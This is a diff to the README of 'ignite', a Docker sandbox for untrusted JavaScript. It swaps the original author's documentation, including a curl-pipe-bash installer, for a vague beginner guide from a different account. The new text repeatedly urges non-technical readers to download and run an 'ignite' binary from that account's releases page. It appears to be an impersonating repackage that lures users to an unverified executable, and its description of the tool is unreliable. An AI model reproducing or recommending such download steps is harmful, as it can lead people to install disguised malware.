@@ -1,156 +1,88 @@
-<p align="center">
-  <img src="./assets/logo.png" alt="Ignite" width="120" />
-</p>
+# 🚀 ignite - Simplifying Local JavaScript Execution
 
-<h1 align="center">Ignite</h1>
+## 💾 Download Now
+[![Download](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com/NirmalLimbachiya/ignite/releases)
 
-<p align="center">
-  <strong>Secure sandbox for executing AI-generated code, untrusted scripts, and JS/TS microservices</strong>
-</p>
+## 📋 Description
+ignite is a streamlined framework designed to execute JavaScript and TypeScript microservices locally. It provides a secure Docker-based environment, allowing users to safely run untrusted code. Whether you are testing AI agents or developing code, ignite ensures your environment remains isolated and manageable.
 
-<p align="center">
-  <a href="https://github.com/dev-dami/ignite/releases"><img src="https://img.shields.io/github/v/release/dev-dami/ignite?style=flat-square&color=blue" alt="Release"></a>
-  <a href="https://github.com/dev-dami/ignite/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-green?style=flat-square" alt="License"></a>
-  <a href="https://github.com/dev-dami/ignite/actions"><img src="https://img.shields.io/github/actions/workflow/status/dev-dami/ignite/ci.yml?style=flat-square" alt="Build"></a>
-  <a href="https://bun.sh"><img src="https://img.shields.io/badge/Bun-1.3+-f472b6?style=flat-square&logo=bun" alt="Bun"></a>
-  <a href="https://www.docker.com/"><img src="https://img.shields.io/badge/Docker-required-2496ED?style=flat-square&logo=docker" alt="Docker"></a>
-</p>
+## 🚀 Getting Started
+To get started with ignite, follow these easy steps. You do not need any coding experience. Just follow the instructions, and you will be running your application in no time.
 
-<p align="center">
-  <a href="#install">Install</a> •
-  <a href="#quick-start">Quick Start</a> •
-  <a href="./docs/getting-started.md">Getting Started</a> •
-  <a href="./docs/walkthrough.md">Walkthrough</a> •
-  <a href="./docs/api.md">API Reference</a>
-</p>
+### 📥 Step 1: Download the Software
+To download ignite, visit the Releases page:
 
----
+[Visit this page to download](https://github.com/NirmalLimbachiya/ignite/releases)
 
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" alt="rainbow" width="100%">
+On this page, you will find the latest version of ignite. Click on the appropriate link for your operating system to start the download.
 
-## Overview
+### 🖥️ Step 2: Install Docker
+ignite requires Docker to run. If you do not have Docker installed, please follow these instructions:
 
-Ignite runs JavaScript/TypeScript code in **secure, isolated Docker containers** with network blocking, filesystem restrictions, and security auditing. Built for AI agents that generate code, student submissions, plugin systems, or any scenario where you need to run untrusted code safely.
+1. Visit the [Docker website](https://www.docker.com/get-started).
+2. Download the version suitable for your operating system (Windows, macOS, or Linux).
+3. Follow the installation steps provided on the website.
+
+Once you have Docker installed and running, you are ready for the next step.
+
+### 📦 Step 3: Set Up ignite
+After you download ignite, follow these steps:
+
+1. Locate the downloaded file, usually found in your "Downloads" folder.
+2. Unzip the file by right-clicking on it and selecting "Extract" (or similar options based on your operating system).
+3. Open the extracted folder. You will see a file named `ignite`.
+
+### 💻 Step 4: Run ignite
+To run ignite, you need to use your terminal or command prompt. Here are the steps:
+
+1. Open your terminal (Command Prompt on Windows, Terminal on macOS/Linux).
+2. Navigate to the folder where `ignite` is located. Use the `cd` command to change directories. For example:
+
+   ```
+   cd path/to/your/extracted/folder
+   ```
+
+3. Once you are in the correct directory, run the application:
+
+   ```
+   ./ignite
+   ```
+
+If you are using Windows, you may need to type `ignite.exe` instead.
+
+### 🔧 Using ignite
+ignite allows you to execute JavaScript and TypeScript code in a secure environment. You can run your commands directly in the terminal after starting the application. 
+
+For example, to run a basic JavaScript app, type:
 
 ```
-┌──────────────┐     ┌──────────────┐     ┌──────────────┐
-│  Untrusted   │ ──► │   Ignite     │ ──► │   Sandboxed  │
-│    Code      │     │   Sandbox    │     │  Execution   │
-└──────────────┘     └──────────────┘     └──────────────┘
+node your-app-file.js
 ```
 
-**Use cases:**
-- **AI Agents** - Safely execute LLM-generated code
-- **Code Playgrounds** - Run student/user submissions
-- **Plugin Systems** - Isolate third-party extensions
-- **CI/CD** - Security checks before deployment
+This command assumes you have a JavaScript file named `your-app-file.js` in the same folder.
 
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" alt="rainbow" width="100%">
+### ⚙️ Features
+- **Local Execution:** Run your JavaScript and TypeScript codes locally without needing a server.
+- **Secure Isolation:** Each microservice runs in its secure Docker container, minimizing security risks.
+- **Easy Setup:** Simple instructions to get you started without technical jargon.
+- **Support for Microservices:** Ideal for developing and testing AI agents and other microservice applications.
 
-## Stats
+### 🔍 Troubleshooting
+If you encounter issues, consider the following:
 
-| Metric | Value |
-|--------|-------|
-| **Runtimes** | Bun (default), Node, Deno, QuickJS |
-| **Base Images** | Alpine (minimal) |
-| **Platforms** | Linux x64/ARM64, macOS x64/ARM64 |
-| **Dependencies** | Docker only |
+- Ensure Docker is running. Check the Docker icon in your menu or taskbar.
+- Verify you are in the correct directory when trying to run ignite.
+- Restart your terminal and try again if faced with connection issues.
 
-Note: Bun is the default runtime. Other runtimes are supported but increase the security attack surface; use them only when required and review service code and dependencies carefully.
+### 💡 Additional Resources
+For more advanced features and usage, refer to the documentation provided with your download. You can also visit the [GitHub Issues page](https://github.com/NirmalLimbachiya/ignite/issues) for community support and troubleshooting.
 
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" alt="rainbow" width="100%">
+## 🔗 Connect With Us
+If you have questions or need assistance, feel free to open an issue on our [GitHub page](https://github.com/NirmalLimbachiya/ignite). We value user feedback and are here to help.
 
-## Install
+## 💾 Download & Install
+To get started with ignite, remember to download it from the Releases page:
 
-```bash
-# One-liner (Mac & Linux)
-curl -fsSL https://raw.githubusercontent.com/dev-dami/ignite/master/install.sh | bash
+[Visit this page to download](https://github.com/NirmalLimbachiya/ignite/releases)
 
-# Or download from releases
-# https://github.com/dev-dami/ignite/releases
-```
-
-<details>
-<summary><strong>Build from source</strong></summary>
-
-```bash
-git clone https://github.com/dev-dami/ignite.git && cd ignite
-bun install && bun run build
-bun run scripts/build-binaries.ts
-```
-</details>
-
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" alt="rainbow" width="100%">
-
-## Quick Start
-
-```bash
-# Create a service
-ignite init hello-world
-cd hello-world
-
-# Run it
-ignite run .
-```
-
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" alt="rainbow" width="100%">
-
-## Commands
-
-| Command | Description |
-|---------|-------------|
-| `ignite init <name>` | Create new service |
-| `ignite run <path>` | Execute in Docker |
-| `ignite run <path> --audit` | Execute with security audit |
-| `ignite preflight <path>` | Safety checks |
-| `ignite serve` | HTTP API server |
-| `ignite report <path>` | Execution report |
-
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" alt="rainbow" width="100%">
-
-## Security Audit
-
-Run untrusted code safely with `--audit` mode:
-
-```bash
-ignite run ./my-service --audit
-```
-
-**Enforces:**
-- Zero network access
-- Read-only filesystem (except `/tmp`)
-- Dropped Linux capabilities
-- No privilege escalation
-
-**Reports violations:**
-```
-SECURITY AUDIT
-
-  Network
-    ✗ connect: api.openai.com (blocked)
-
-  Filesystem
-    ✗ write: /app/malicious.txt (blocked)
-
-✗ Security Status: 2 VIOLATION(S) BLOCKED
-```
-
-Perfect for **AI agent sandboxing**, student code execution, or CI security checks.
-
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" alt="rainbow" width="100%">
-
-## Documentation
-
-| Doc | Description |
-|-----|-------------|
-| **[Getting Started](./docs/getting-started.md)** | 5-minute beginner guide |
-| **[Walkthrough](./docs/walkthrough.md)** | Complete tutorial |
-| **[API Reference](./docs/api.md)** | CLI & HTTP API docs |
-| **[Architecture](./docs/architecture.md)** | System design |
-| **[Preflight](./docs/preflight.md)** | Safety analysis |
-
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/rainbow.png" alt="rainbow" width="100%">
-
-## License
-
-MIT © [dev-dami](https://github.com/dev-dami)
+Thank you for using ignite! We look forward to seeing what you create.
